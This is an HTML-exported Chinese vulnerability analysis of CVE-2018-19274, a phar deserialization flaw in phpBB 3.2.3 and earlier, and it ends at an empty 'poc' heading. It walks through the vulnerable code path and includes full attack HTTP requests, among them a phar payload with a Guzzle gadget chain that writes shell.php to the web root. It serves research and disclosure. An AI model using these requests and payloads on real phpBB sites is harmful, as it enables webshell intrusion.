<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-19274phpbb-phar反序列化远程代码漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-19274</span><span class="csECDA2D3">）</span><span class="csDE05BCC">PhpBB Phar</span><span class="csECDA2D3">反序列化远程代码漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">攻击者若通过社工，弱口令，钓鱼等方式拥有控制管理面板权限，可先前台上传恶意附件，再进入后台控制管理面板利用设置中对路径的验证的功能，结合</span><span class="cs8926E06">PHP phar </span><span class="cs9C1B1871">反序列化进行</span><span class="cs8926E06">php</span><span class="cs9C1B1871">对象注入，构造可用的恶意攻击链，获取</span><span class="cs8926E06">Webshell</span><span class="cs9C1B1871">。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">phpBB v3.2.3</span><span class="cs9C1B1871">及以前的版本</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">先看触发</span><span class="cs8926E06">php phar</span><span class="cs9C1B1871">反序列化漏洞的核心代码如下：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件位置：</span><span class="cs9FB05234">phpBB3/includes/functions_acp.php::validate_config_vars</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="162" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs9FB05234">file_exists</span><span class="cs9C1B1871">函数判断</span><span class="cs9FB05234">$path</span><span class="cs9C1B1871">是否存在，此处若可以被我们上传</span><span class="cs8926E06">PHAR</span><span class="cs9C1B1871">归档包，文件路径若被我们可知可控，就可以通过</span><span class="cs9FB05234">phar://</span><span class="cs9C1B1871">协议进行反序列化攻击。</span></p><h3 class="cs868C439D">
			<a name="触发点分析"><span class="csD6CA00D2">触发点分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先是载入的时候调用</span><span class="cs9FB05234">acp_attachments-&gt;main()</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件位置：</span><span class="cs9FB05234">phpBB3/includes/acp/acp_attachments.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="247" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">关键函数为</span><span class="cs9FB05234">validate_config_vars</span><span class="cs9C1B1871">函数，第一个参数为</span><span class="cs9FB05234">$display_vars[&#39;vars&#39;]</span><span class="cs9C1B1871">来自上文的系统配置定义：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="226" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二个参数通过</span><span class="cs9FB05234">$_REQUEST</span><span class="cs9C1B1871">接收，</span><span class="cs8926E06">post</span><span class="cs9C1B1871">发送数组参数</span><span class="cs9FB05234">config</span><span class="cs9C1B1871">，被赋值成为</span><span class="cs9FB05234">$cfg_array</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">两个参数传入</span><span class="cs9FB05234">validate_config_vars</span><span class="cs9C1B1871">函数，继续跟进。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件位置：</span><span class="cs9FB05234">phpBB3/includes/functions_acp.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="399" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入函数后使用</span><span class="cs9FB05234">foreach</span><span class="cs9C1B1871">对</span><span class="cs9FB05234">$config_vars</span><span class="cs9C1B1871">进行遍历，键名为</span><span class="cs9FB05234">$config_name</span><span class="cs9C1B1871">，键值为</span><span class="cs9FB05234">$config_definition</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先对</span><span class="cs9FB05234">$cfg_array</span><span class="cs9C1B1871">进行判断，也就是</span><span class="cs8926E06">post</span><span class="cs9C1B1871">数组中必须有和系统配置数组相同的键名的数组；然后又对键值的判断是否存在</span><span class="cs9FB05234">$config_definition[&#39;validate&#39;]</span><span class="cs9C1B1871">。两个条件需要同时满足，不满足就跳过此变量循环，存在就对</span><span class="cs9FB05234">$config_definition[&#39;validate&#39;]</span><span class="cs9C1B1871">进行分割为数组，并取第</span><span class="cs8926E06">0</span><span class="cs9C1B1871">个参数传进</span><span class="cs9FB05234">switch</span><span class="cs9C1B1871">进行匹配，可以发现利用点在</span><span class="cs9FB05234">wpath</span><span class="cs9C1B1871">分支里：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="128" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">满足上文两条件并且</span><span class="cs9FB05234">$validator[$type]==wpath</span><span class="cs9C1B1871">才能进入分支，对系统配置数组进行筛选，暂时发现只有键名为</span><span class="cs9FB05234">upload_path</span><span class="cs9C1B1871">的数组满足条件。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是在进入路径判断前有一个三元运算</span></p><p class="cs3A447A38"><span class="cs9FB05234">$path = in_array($config_definition[&#39;validate&#39;], array(&#39;wpath&#39;, &#39;path&#39;, &#39;rpath&#39;, &#39;rwpath&#39;)) ? $phpbb_root_path . $cfg_array[$config_name] : $cfg_array[$config_name];</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">经过判断</span><span class="cs9FB05234">$config_definition[&#39;validate&#39;]</span><span class="cs9C1B1871">在数组之中，所以会走第一个分支，</span><span class="cs9FB05234">$cfg_array[$config_name]</span><span class="cs9C1B1871">就是</span><span class="cs8926E06">post</span><span class="cs9C1B1871">数组变量，此处可控，但是会和</span><span class="cs9FB05234">$phpbb_root_path</span><span class="cs9C1B1871">进行拼接。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">文件位置：</span><span class="cs9FB05234">phpBB3/adm/index.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="139" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此拼接后的</span><span class="cs9FB05234">$path</span><span class="cs9C1B1871">会变成</span><span class="cs9FB05234">./../xxxxxxxxxx</span><span class="cs9C1B1871">，路径出错无法利用，如下。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="584" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是这里的整个</span><span class="cs9FB05234">switch</span><span class="cs9C1B1871">语句犯了一个较为低级的错误，部分条件的语句段没有使用</span><span class="cs9FB05234">break</span><span class="cs9C1B1871">进行结束。</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">switch</span><span class="cs9C1B1871">执行方式：开始时没有代码被执行。仅当一个</span><span class="cs8926E06"> </span><span class="cs9FB05234">case</span><span class="cs9C1B1871">语句中的值和</span><span class="cs8926E06"> </span><span class="cs9FB05234">switch</span><span class="cs9C1B1871">表达式的值匹配时</span><span class="cs8926E06"> PHP </span><span class="cs9C1B1871">才开始执行语句，直到</span><span class="cs9FB05234">switch</span><span class="cs9C1B1871">的程序段结束或者遇到第一个</span><span class="cs9FB05234">break</span><span class="cs8926E06"> </span><span class="cs9C1B1871">语句为止。如果不在</span><span class="cs9FB05234">case</span><span class="cs9C1B1871">的语句段最后写上</span><span class="cs9FB05234">break</span><span class="cs9C1B1871">的话，</span><span class="cs8926E06">PHP </span><span class="cs9C1B1871">将继续执行下一个</span><span class="cs9FB05234">case</span><span class="cs9C1B1871">中的语句段。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="259" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此需要在</span><span class="cs9FB05234">$config_vars</span><span class="cs9C1B1871">找到一个元素</span><span class="cs9FB05234">$config_definition</span><span class="cs9C1B1871">，并且</span><span class="cs9FB05234">$config_definition[&#39;validate&#39;]</span><span class="cs9C1B1871">等于</span><span class="cs9FB05234">absolute_path</span><span class="cs9C1B1871">或者</span><span class="cs9FB05234">absolute_path_writable</span><span class="cs9C1B1871">或者</span><span class="cs9FB05234">path</span><span class="cs9C1B1871">，这样就能即进入</span><span class="cs9FB05234">wpath</span><span class="cs9C1B1871">执行也不增加</span><span class="cs9FB05234">$path</span><span class="cs9C1B1871">的前缀</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用如下代码过滤：</span></p><p class="cs3A447A38"><span class="cs9FB05234">foreach ($display_vars[&#39;vars&#39;] as $key =&gt;$value){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (($value[&#39;validate&#39;] === &#39;absolute_path&#39;) or ($value[&#39;validate&#39;] === &#39;absolute_path_writable&#39;) or ($value[&#39;validate&#39;] === &#39;path&#39;)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;66&#39;.$key.&#39;77&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发现</span><span class="cs9FB05234">img_imagick</span><span class="cs9C1B1871">元素满足条件：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="140" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入控制面板的附件设定，提交并该修改数据包</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="373" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">数据包如下，关键点为</span><span class="cs9FB05234">config[img_imagick]</span><span class="cs9C1B1871">参数：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /phpBB3/adm/index.php?i=acp_attachments&amp;mode=attach&amp;sid=385d5172c29a3a9530d6b467a5691ffd HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: python-requests/2.21.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 967</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">config%5Ballow_attachments%5D=1&amp;config%5Ballow_pm_attach%5D=0&amp;config%5Bupload_path%5D=files&amp;config%5Bdisplay_order%5D=0&amp;config%5Battachment_quota%5D=50&amp;attachment_quota=mb&amp;config%5Bmax_filesize%5D=256&amp;max_filesize=kb&amp;config%5Bmax_filesize_pm%5D=256&amp;max_filesize_pm=kb&amp;config%5Bmax_attachments%5D=3&amp;config%5Bmax_attachments_pm%5D=1&amp;config%5Bsecure_downloads%5D=0&amp;config%5Bsecure_allow_deny%5D=1&amp;config%5Bsecure_allow_empty_referer%5D=1&amp;config%5Bcheck_attachment_content%5D=1&amp;config%5Bimg_display_inlined%5D=1&amp;config%5Bimg_create_thumbnail%5D=0&amp;config%5Bimg_max_thumb_width%5D=400&amp;config%5Bimg_min_thumb_filesize%5D=12000&amp;config%5Bimg_imagick%5D=phar://../files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip.part/&amp;config%5Bimg_max_width%5D=0&amp;config%5Bimg_max_height%5D=0&amp;config%5Bimg_link_width%5D=0&amp;config%5Bimg_link_height%5D=0&amp;submit=Submit&amp;ips=&amp;ipexclude=0&amp;creation_time=1552465991&amp;form_token=0910a5dc9a13fc50a0ead4656617642fa80daaf1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时已经可以触发反序列化，还需上传包含利用链的恶意附件。</span></p><h3 class="cs868C439D">
			<a name="上传恶意附件"><span class="csD6CA00D2">上传恶意附件</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">上传位置为前台发帖附件处</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="562" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">处理文件上传的关键函数，以及函数调用栈：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件位置：</span><span class="cs9FB05234">phpBB3/phpbb/plupload/plupload.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="510" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这里函数</span><span class="cs8926E06">handle_upload</span><span class="cs9C1B1871">可以实现多个</span><span class="cs9FB05234">chunk</span><span class="cs9C1B1871">处理。</span><span class="cs9FB05234">$this-&gt;request-&gt;variable</span><span class="cs9C1B1871">函数根据键名从请求中获取值，首先获取</span><span class="cs9FB05234">chunks</span><span class="cs9C1B1871">的值，并判断</span><span class="cs9FB05234">chunk</span><span class="cs9C1B1871">是否小于</span><span class="cs8926E06">2</span><span class="cs9C1B1871">，如果小于就直接返回，如果大于就开始进行多</span><span class="cs9FB05234">chunk</span><span class="cs9C1B1871">处理。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后进入关键的</span><span class="cs9FB05234">temporary_filepath</span><span class="cs9C1B1871">函数：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="194" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这个就是计算上传文件路径的函数，</span><span class="cs9FB05234">$this-&gt;temporary_directory</span><span class="cs9C1B1871">可知为</span><span class="cs9FB05234">./files/plupload</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">$file_name</span><span class="cs9C1B1871">可控，</span><span class="cs9FB05234">\phpbb\files\filespec::get_extension($file_name)</span><span class="cs9C1B1871">获取文件的后缀同样可控，比较麻烦的是</span><span class="cs9FB05234">$this-&gt;config[&#39;plupload_salt&#39;]</span><span class="cs9C1B1871">存在于数据库中，但可以在管理面板中通过备份进行获取。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image13.png" width="560" height="223" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">plupload_salt</span><span class="cs9C1B1871">如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image14.png" width="560" height="21" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时已经完全可以计算路径</span></p><p class="cs3A447A38"><span class="cs9FB05234">./files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后进入函数进行文件写入</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image15.png" width="560" height="366" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">中途会产生一个临时文件，但后面会删除，最后文件名还会增加</span><span class="cs9FB05234">.part</span><span class="cs9C1B1871">后缀。</span></p><p class="cs3A447A38"><span class="cs9FB05234">./files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip.part</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">攻击数据包如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /phpBB3/posting.php?mode=post&amp;f=2&amp;sid=a3f8b226bd4ad508d8838284c0cfc332 HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 1909</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Origin: http://bugtest.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">x-requested-with: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">x-phpbb-using-plupload: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://bugtest.com/phpBB3/posting.php?mode=post&amp;f=2&amp;sid=52c63bf06fdeaef60de9b8fba1de97ad</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;name&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">rai4over.zip</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;chunk&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;chunks&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;add_file&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Add the file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;real_filename&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">payload.phar.zip</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;attachment_data[0][attach_id]&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">16</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;attachment_data[0][is_orphan]&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;attachment_data[0][real_filename]&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">payload.zip</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;attachment_data[0][attach_comment]&quot;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;attachment_data[0][filesize]&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">35802</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;fileupload&quot;; filename=&quot;payload.phar.zip&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/zip</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;?php __HALT_COMPILER(); ?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&Otilde;O:31:&quot;GuzzleHttp\Cookie\FileCookieJar&quot;:4:{s:41:&quot;GuzzleHttp\Cookie\FileCookieJarfilename&quot;;s:42:&quot;/Applications/MAMP/htdocs/phpBB3/shell.php&quot;;s:52:&quot;GuzzleHttp\Cookie\FileCookieJarstoreSessionCookies&quot;;b:1;s:36:&quot;GuzzleHttp\Cookie\CookieJarcookies&quot;;a:1:{i:0;O:27:&quot;GuzzleHttp\Cookie\SetCookie&quot;:1:{s:33:&quot;GuzzleHttp\Cookie\SetCookiedata&quot;;a:3:{s:7:&quot;Expires&quot;;i:1;s:7:&quot;Discard&quot;;b:0;s:5:&quot;Value&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}}}s:39:&quot;GuzzleHttp\Cookie\CookieJarstrictMode&quot;;N;}test.txt&ouml;&igrave;\~&Oslash;&para;test&uml;~&ecirc;&divide;z]&copy;&auml;g4GBMB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundaryuHMhmTMPyBMwbiEg--</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">至此我们已经对上传文件路径内容可知可控，还恶意文件中的利用链。</span></p><h3 class="cs868C439D">
			<a name="利用链"><span class="csD6CA00D2">利用链</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">利用</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">网络请求插件</span><span class="cs8926E06">Guzzle</span><span class="cs9C1B1871">完成反序列化利用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件位置：</span><span class="cs9FB05234">phpBB3/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PhpBB/%ef%bc%88CVE-2018-19274%ef%bc%89PhpBB%20Phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%bc%8f%e6%b4%9e_files/image16.png" width="560" height="476" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">析构函数调用</span><span class="cs9FB05234">save</span><span class="cs9C1B1871">函数，最后使用</span><span class="cs9FB05234">file_put_contents</span><span class="cs9C1B1871">完成文件写入，整个漏洞利用完成。</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
